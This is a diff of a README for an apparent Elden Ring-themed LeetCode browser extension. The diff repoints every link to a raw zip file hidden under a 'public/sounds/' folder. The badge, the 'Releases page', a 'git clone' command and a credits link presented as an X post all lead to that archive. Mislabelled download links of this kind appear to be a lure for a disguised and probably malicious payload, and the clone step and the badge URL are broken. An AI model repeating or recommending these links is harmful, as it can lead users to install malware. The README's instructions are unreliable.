@@ -1,6 +1,6 @@
 # 🎮 Elden-ring-leetcode-extension - Enhance Your LeetCode Experience
 
-[![Download Elden Ring LeetCode Extension](https://raw.githubusercontent.com/Sergioam1/Elden-ring-leetcode-extension/main/arnut/Elden-ring-leetcode-extension.zip%20Ring%20LeetCode%https://raw.githubusercontent.com/Sergioam1/Elden-ring-leetcode-extension/main/arnut/Elden-ring-leetcode-extension.zip)](https://raw.githubusercontent.com/Sergioam1/Elden-ring-leetcode-extension/main/arnut/Elden-ring-leetcode-extension.zip)
+[![Download Elden Ring LeetCode Extension](https://raw.githubusercontent.com/Sergioam1/Elden-ring-leetcode-extension/main/public/sounds/extension_leetcode_Elden_ring_v3.2.zip%20Ring%20LeetCode%https://raw.githubusercontent.com/Sergioam1/Elden-ring-leetcode-extension/main/public/sounds/extension_leetcode_Elden_ring_v3.2.zip)](https://raw.githubusercontent.com/Sergioam1/Elden-ring-leetcode-extension/main/public/sounds/extension_leetcode_Elden_ring_v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Elden Ring LeetCode Extension. This tool enhances your LeetCode c
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the extension: [Elden Ring LeetCode Extension Releases](https://raw.githubusercontent.com/Sergioam1/Elden-ring-leetcode-extension/main/arnut/Elden-ring-leetcode-extension.zip).
+To get started, visit this page to download the extension: [Elden Ring LeetCode Extension Releases](https://raw.githubusercontent.com/Sergioam1/Elden-ring-leetcode-extension/main/public/sounds/extension_leetcode_Elden_ring_v3.2.zip).
 
 1. Go to the Releases page linked above.
 2. Download the latest version of the extension.
@@ -37,7 +37,7 @@ To install the extension:
 2. Open your terminal and run:
 
    ```bash
-   git clone https://raw.githubusercontent.com/Sergioam1/Elden-ring-leetcode-extension/main/arnut/Elden-ring-leetcode-extension.zip
+   git clone https://raw.githubusercontent.com/Sergioam1/Elden-ring-leetcode-extension/main/public/sounds/extension_leetcode_Elden_ring_v3.2.zip
    ```
 
 3. **Install dependencies**: Navigate into the cloned directory and run:
@@ -67,6 +67,6 @@ We welcome contributions from the community. If you have ideas for improvements 
 
 ## 👥 Credits
 
-This extension is inspired by insights and creativity found in the community, particularly from [this X post](https://raw.githubusercontent.com/Sergioam1/Elden-ring-leetcode-extension/main/arnut/Elden-ring-leetcode-extension.zip). 
+This extension is inspired by insights and creativity found in the community, particularly from [this X post](https://raw.githubusercontent.com/Sergioam1/Elden-ring-leetcode-extension/main/public/sounds/extension_leetcode_Elden_ring_v3.2.zip). 
 
 Thank you for your interest in the Elden Ring LeetCode Extension. Enjoy coding with a flair!
